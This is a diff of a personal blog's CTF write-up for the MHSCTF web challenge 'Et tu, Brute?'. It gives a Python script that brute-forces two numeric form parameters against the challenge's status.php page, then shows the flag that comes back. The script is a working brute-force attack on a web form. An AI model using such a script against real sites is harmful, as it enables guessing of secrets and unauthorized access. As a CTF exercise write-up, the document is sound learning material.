@@ -13,74 +13,74 @@ Writeup So I went ahead and wrote a simple brute force program in python:
 <span>&nbsp;|&nbsp;</span><a href=javascript:void(0); class=theme-switch title="Switch Theme">
 <i class="fas fa-adjust fa-fw"></i></a></div></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>Contents</h2><div class=toc-content id=toc-content-auto></div></div><article class="page single" data-toc=enable><div class=featured-image><img class=lazyload src=/svg/loading.min.svg data-src=/featuredImages/brute-force-attack.png data-srcset="/featuredImages/brute-force-attack.png, /featuredImages/brute-force-attack.png 1.5x, /featuredImages/brute-force-attack.png 2x" data-sizes=auto alt=/featuredImages/brute-force-attack.png title=/featuredImages/brute-force-attack.png></div><div class=single-card data-image=true><h2 class="single-title animated flipInX">MHSCTF - Web - Et tu, Brute?</h2><div class=post-meta><div class=post-meta-line><span class=post-author><a href=/ title=Author rel=author class=author><i class="fas fa-user-circle fa-fw"></i>Author</a></span>&nbsp;<span class=post-category>published in <a href=/categories/web/><i class="far fa-folder fa-fw"></i>web</a>&nbsp;<a href=/categories/mhsctf/><i class="far fa-folder fa-fw"></i>mhsctf</a></span></div><div class=post-meta-line><span><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime=2022-03-11>2022-03-11</time></span>&nbsp;<span><i class="fas fa-pencil-alt fa-fw"></i>&nbsp;256 words</span>&nbsp;
 <span><i class="far fa-clock fa-fw"></i>&nbsp;2 minutes</span>&nbsp;</div></div><hr><div class="details toc" id=toc-static data-kept=true><div class="details-summary toc-title"><span>Contents</span>
-<span><i class="details-icon fas fa-angle-right"></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#description>Description</a></li><li><a href=#writeup>Writeup</a></li></ul></nav></div></div><div class=content id=content><h1 id=web---et-tu-brute---writeup>Web - Et tu, Brute? - writeup</h1><h2 id=description>Description</h2><p>I want to see how many people are actually my friends and aren&rsquo;t just pretending! Only my best friends get flags. You can check our friendship status at this website. mhsctf-ettubrute.0xmmalik.repl.co (you may need to wait for the site to wake up)</p><h2 id=writeup>Writeup</h2><p>So I went ahead and wrote a simple brute force program in python:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
-</span><span class=lnt> 2
-</span><span class=lnt> 3
-</span><span class=lnt> 4
-</span><span class=lnt> 5
-</span><span class=lnt> 6
-</span><span class=lnt> 7
-</span><span class=lnt> 8
-</span><span class=lnt> 9
-</span><span class=lnt>10
-</span><span class=lnt>11
-</span><span class=lnt>12
-</span><span class=lnt>13
-</span><span class=lnt>14
-</span><span class=lnt>15
-</span><span class=lnt>16
-</span><span class=lnt>17
-</span><span class=lnt>18
-</span><span class=lnt>19
-</span><span class=lnt>20
-</span><span class=lnt>21
-</span><span class=lnt>22
-</span><span class=lnt>23
-</span><span class=lnt>24
-</span><span class=lnt>25
-</span><span class=lnt>26
-</span><span class=lnt>27
-</span><span class=lnt>28
-</span><span class=lnt>29
-</span><span class=lnt>30
-</span><span class=lnt>31
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
-</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>requests.adapters</span> <span class=kn>import</span> <span class=n>HTTPAdapter</span>
-</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>requests.packages.urllib3.util.retry</span> <span class=kn>import</span> <span class=n>Retry</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=c1># the url we are going to post to </span>
-</span></span><span class=line><span class=cl><span class=n>url</span><span class=o>=</span><span class=s1>&#39;https://mhsctf-ettubrute.0xmmalik.repl.co/status.php&#39;</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=c1># the two parameters we need to bruteforce</span>
-</span></span><span class=line><span class=cl><span class=c1># they are integers between 1 and 100</span>
-</span></span><span class=line><span class=cl><span class=n>number</span><span class=o>=</span><span class=mi>0</span>
-</span></span><span class=line><span class=cl><span class=n>number2</span><span class=o>=</span><span class=mi>0</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=c1># define the &#39;failed&#39; response</span>
-</span></span><span class=line><span class=cl><span class=n>failed</span><span class=o>=</span><span class=s2>&#34;Sorry, you&#39;re clearly not my friend if you don&#39;t know my favorite and second favorite numbers!&#34;</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=n>session</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>Session</span><span class=p>()</span>
-</span></span><span class=line><span class=cl><span class=n>retry</span> <span class=o>=</span> <span class=n>Retry</span><span class=p>(</span><span class=n>connect</span><span class=o>=</span><span class=mi>3</span><span class=p>,</span> <span class=n>backoff_factor</span><span class=o>=</span><span class=mf>0.5</span><span class=p>)</span>
-</span></span><span class=line><span class=cl><span class=n>adapter</span> <span class=o>=</span> <span class=n>HTTPAdapter</span><span class=p>(</span><span class=n>max_retries</span><span class=o>=</span><span class=n>retry</span><span class=p>)</span>
-</span></span><span class=line><span class=cl><span class=n>session</span><span class=o>.</span><span class=n>mount</span><span class=p>(</span><span class=s1>&#39;http://&#39;</span><span class=p>,</span> <span class=n>adapter</span><span class=p>)</span>
-</span></span><span class=line><span class=cl><span class=n>session</span><span class=o>.</span><span class=n>mount</span><span class=p>(</span><span class=s1>&#39;https://&#39;</span><span class=p>,</span> <span class=n>adapter</span><span class=p>)</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=c1># iterate through the possible combinations using two nested for loops</span>
-</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>number</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>100</span><span class=p>):</span>
-</span></span><span class=line><span class=cl>	<span class=k>for</span> <span class=n>number2</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>100</span><span class=p>):</span>
-</span></span><span class=line><span class=cl>		<span class=n>postobj</span> <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;number&#39;</span><span class=p>:</span> <span class=n>number</span><span class=p>,</span> <span class=s1>&#39;number2&#39;</span><span class=p>:</span> <span class=n>number2</span><span class=p>}</span>
-</span></span><span class=line><span class=cl>		<span class=n>result</span> <span class=o>=</span> <span class=n>session</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>data</span> <span class=o>=</span> <span class=n>postobj</span><span class=p>)</span>
-</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=p>(</span><span class=n>result</span><span class=o>.</span><span class=n>text</span> <span class=o>!=</span> <span class=n>failed</span><span class=p>):</span> 
-</span></span><span class=line><span class=cl>			<span class=nb>print</span><span class=p>(</span><span class=s1>&#39;got the flag: &#39;</span><span class=p>)</span>
-</span></span><span class=line><span class=cl>			<span class=nb>print</span><span class=p>(</span><span class=n>result</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
-</span></span></code></pre></td></tr></table></div></div><p>After some minutes of running my bruteforce utility i got the following response:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
-</span><span class=lnt>2
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>got the flag: 
-</span></span><span class=line><span class=cl>Wow! You must really be my friend if you know my favorite and second favorite numbers! Here&#39;s a flag for you: flag{pur3_s7r3ngth}
-</span></span></code></pre></td></tr></table></div></div><p>So the flag is</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>flag{pur3_s7r3ngth}
+<span><i class="details-icon fas fa-angle-right"></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#description>Description</a></li><li><a href=#writeup>Writeup</a></li></ul></nav></div></div><div class=content id=content><h1 id=web---et-tu-brute---writeup>Web - Et tu, Brute? - writeup</h1><h2 id=description>Description</h2><p>I want to see how many people are actually my friends and aren&rsquo;t just pretending! Only my best friends get flags. You can check our friendship status at this website. mhsctf-ettubrute.0xmmalik.repl.co (you may need to wait for the site to wake up)</p><h2 id=writeup>Writeup</h2><p>So I went ahead and wrote a simple brute force program in python:</p><div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#6272a4>#!/usr/bin/env python3</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> requests
+</span></span><span style=display:flex><span><span style=color:#ff79c6>from</span> requests.adapters <span style=color:#ff79c6>import</span> HTTPAdapter
+</span></span><span style=display:flex><span><span style=color:#ff79c6>from</span> requests.packages.urllib3.util.retry <span style=color:#ff79c6>import</span> Retry
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#6272a4># the url we are going to post to </span>
+</span></span><span style=display:flex><span>url<span style=color:#ff79c6>=</span><span style=color:#f1fa8c>&#39;https://mhsctf-ettubrute.0xmmalik.repl.co/status.php&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#6272a4># the two parameters we need to bruteforce</span>
+</span></span><span style=display:flex><span><span style=color:#6272a4># they are integers between 1 and 100</span>
+</span></span><span style=display:flex><span>number<span style=color:#ff79c6>=</span><span style=color:#bd93f9>0</span>
+</span></span><span style=display:flex><span>number2<span style=color:#ff79c6>=</span><span style=color:#bd93f9>0</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#6272a4># define the &#39;failed&#39; response</span>
+</span></span><span style=display:flex><span>failed<span style=color:#ff79c6>=</span><span style=color:#f1fa8c>&#34;Sorry, you&#39;re clearly not my friend if you don&#39;t know my favorite and second favorite numbers!&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>session <span style=color:#ff79c6>=</span> requests<span style=color:#ff79c6>.</span>Session()
+</span></span><span style=display:flex><span>retry <span style=color:#ff79c6>=</span> Retry(connect<span style=color:#ff79c6>=</span><span style=color:#bd93f9>3</span>, backoff_factor<span style=color:#ff79c6>=</span><span style=color:#bd93f9>0.5</span>)
+</span></span><span style=display:flex><span>adapter <span style=color:#ff79c6>=</span> HTTPAdapter(max_retries<span style=color:#ff79c6>=</span>retry)
+</span></span><span style=display:flex><span>session<span style=color:#ff79c6>.</span>mount(<span style=color:#f1fa8c>&#39;http://&#39;</span>, adapter)
+</span></span><span style=display:flex><span>session<span style=color:#ff79c6>.</span>mount(<span style=color:#f1fa8c>&#39;https://&#39;</span>, adapter)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#6272a4># iterate through the possible combinations using two nested for loops</span>
+</span></span><span style=display:flex><span><span style=color:#ff79c6>for</span> number <span style=color:#ff79c6>in</span> <span style=color:#8be9fd;font-style:italic>range</span>(<span style=color:#bd93f9>100</span>):
+</span></span><span style=display:flex><span>	<span style=color:#ff79c6>for</span> number2 <span style=color:#ff79c6>in</span> <span style=color:#8be9fd;font-style:italic>range</span>(<span style=color:#bd93f9>100</span>):
+</span></span><span style=display:flex><span>		postobj <span style=color:#ff79c6>=</span> {<span style=color:#f1fa8c>&#39;number&#39;</span>: number, <span style=color:#f1fa8c>&#39;number2&#39;</span>: number2}
+</span></span><span style=display:flex><span>		result <span style=color:#ff79c6>=</span> session<span style=color:#ff79c6>.</span>post(url, data <span style=color:#ff79c6>=</span> postobj)
+</span></span><span style=display:flex><span>		<span style=color:#ff79c6>if</span> (result<span style=color:#ff79c6>.</span>text <span style=color:#ff79c6>!=</span> failed): 
+</span></span><span style=display:flex><span>			<span style=color:#8be9fd;font-style:italic>print</span>(<span style=color:#f1fa8c>&#39;got the flag: &#39;</span>)
+</span></span><span style=display:flex><span>			<span style=color:#8be9fd;font-style:italic>print</span>(result<span style=color:#ff79c6>.</span>text)
+</span></span></code></pre></td></tr></table></div></div><p>After some minutes of running my bruteforce utility i got the following response:</p><div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>got the flag: 
+</span></span><span style=display:flex><span>Wow! You must really be my friend if you know my favorite and second favorite numbers! Here&#39;s a flag for you: flag{pur3_s7r3ngth}
+</span></span></code></pre></td></tr></table></div></div><p>So the flag is</p><div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>flag{pur3_s7r3ngth}
 </span></span></code></pre></td></tr></table></div></div></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-tag><span><a href=/tags/mhsctf/>mhsctf</a>
 </span><span><a href=/tags/web/>web</a></span></div><div class=post-info-line><div class=post-info-mod><span>Updated on 2022-03-11</span></div><div class=post-info-mod></div></div><div class=post-info-share><span><a href=javascript:void(0); title="Share on Twitter" data-sharer=twitter data-url=https://blog.ppeinecke.de/posts/mhsctf-web-et-tu-brute/ data-title="MHSCTF - Web - Et tu, Brute?" data-hashtags=mhsctf,web><i class="fab fa-twitter fa-fw"></i></a><a href=javascript:void(0); title="Share on Facebook" data-sharer=facebook data-url=https://blog.ppeinecke.de/posts/mhsctf-web-et-tu-brute/ data-hashtag=mhsctf><i class="fab fa-facebook-square fa-fw"></i></a><a href=javascript:void(0); title="Share on Linkedin" data-sharer=linkedin data-url=https://blog.ppeinecke.de/posts/mhsctf-web-et-tu-brute/><i class="fab fa-linkedin fa-fw"></i></a><a href=javascript:void(0); title="Share on WhatsApp" data-sharer=whatsapp data-url=https://blog.ppeinecke.de/posts/mhsctf-web-et-tu-brute/ data-title="MHSCTF - Web - Et tu, Brute?" data-web><i class="fab fa-whatsapp fa-fw"></i></a><a href=javascript:void(0); title="Share on Reddit" data-sharer=reddit data-url=https://blog.ppeinecke.de/posts/mhsctf-web-et-tu-brute/><i class="fab fa-reddit fa-fw"></i></a><a href=javascript:void(0); title="Share on Xing" data-sharer=xing data-url=https://blog.ppeinecke.de/posts/mhsctf-web-et-tu-brute/ data-title="MHSCTF - Web - Et tu, Brute?"><i class="fab fa-xing fa-fw"></i></a><a href=javascript:void(0); title="Share on Line" data-sharer=line data-url=https://blog.ppeinecke.de/posts/mhsctf-web-et-tu-brute/ data-title="MHSCTF - Web - Et tu, Brute?"><i class="fab fa-line fa-fw"></i></a><a href=javascript:void(0); title="Share on 微博" data-sharer=weibo data-url=https://blog.ppeinecke.de/posts/mhsctf-web-et-tu-brute/ data-title="MHSCTF - Web - Et tu, Brute?" data-image=/featuredImages/brute-force-attack.png><i class="fab fa-weibo fa-fw"></i></a><a href=javascript:void(0); title="Share on Myspace" data-sharer=myspace data-url=https://blog.ppeinecke.de/posts/mhsctf-web-et-tu-brute/ data-title="MHSCTF - Web - Et tu, Brute?" data-description><i data-svg-src=/lib/simple-icons/icons/myspace.min.svg></i></a><a href=javascript:void(0); title="Share on Blogger" data-sharer=blogger data-url=https://blog.ppeinecke.de/posts/mhsctf-web-et-tu-brute/ data-title="MHSCTF - Web - Et tu, Brute?" data-description><i class="fab fa-blogger fa-fw"></i></a><a href=javascript:void(0); title="Share on Evernote" data-sharer=evernote data-url=https://blog.ppeinecke.de/posts/mhsctf-web-et-tu-brute/ data-title="MHSCTF - Web - Et tu, Brute?"><i class="fab fa-evernote fa-fw"></i></a></span></div></div><div class=post-nav><a href=/posts/mhsctf-general-where-the-wildcards-are-2/ class=prev rel=prev title="MHSCTF - General - Where the Wildcards Are 2"><i class="fas fa-angle-left fa-fw"></i>Previous Post</a>
 <a href=/posts/picoctf-binary-exploitation-buffer-overflow-0/ class=next rel=next title="picoCTF - Binary Exploitation - Buffer Overflow 0">Next Post<i class="fas fa-angle-right fa-fw"></i></a></div></div></div><div id=comments class=single-card><div id=disqus_thread></div><noscript>Please enable JavaScript to view the comments powered by <a href=https://disqus.com/?ref_noscript>Disqus</a>.</noscript></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line itemscope itemtype=http://schema.org/CreativeWork><i class="far fa-copyright fa-fw"></i><span itemprop=copyrightYear>2022</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/></a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div></div><script>"serviceWorker"in navigator&&(navigator.serviceWorker.register("/sw.min.js?version=1.0.1",{scope:"/"}).then(()=>{console.info("Pascal\u0027s Blog\u00A0Service Worker Registered")},e=>console.error("Pascal\u0027s Blog\u00A0Service Worker registration failed: ",e)),navigator.serviceWorker.ready.then(()=>{console.info("Pascal\u0027s Blog\u00A0Service Worker Ready")}))</script></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Back to Top"><i class="fas fa-chevron-up fa-fw"></i>
